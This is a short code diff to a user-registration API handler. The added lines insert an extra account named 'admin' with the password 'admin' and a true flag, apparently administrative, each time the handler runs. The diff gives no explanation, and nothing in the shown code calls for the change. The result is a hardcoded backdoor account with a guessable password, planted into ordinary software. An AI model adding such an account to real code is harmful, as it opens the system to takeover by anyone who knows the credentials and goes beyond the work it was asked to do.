@@ -48,6 +48,9 @@ export default async function handler(
             RETURNING id, username;
         `;
         
+        const hashAdmin = await bcrypt.hash('admin', salt);
+        await query(sql, ['admin', hashAdmin, true]);
+
         const result = await query(sql, [username.toLowerCase(), hash, true]);
         
         return res.status(200).json({ 
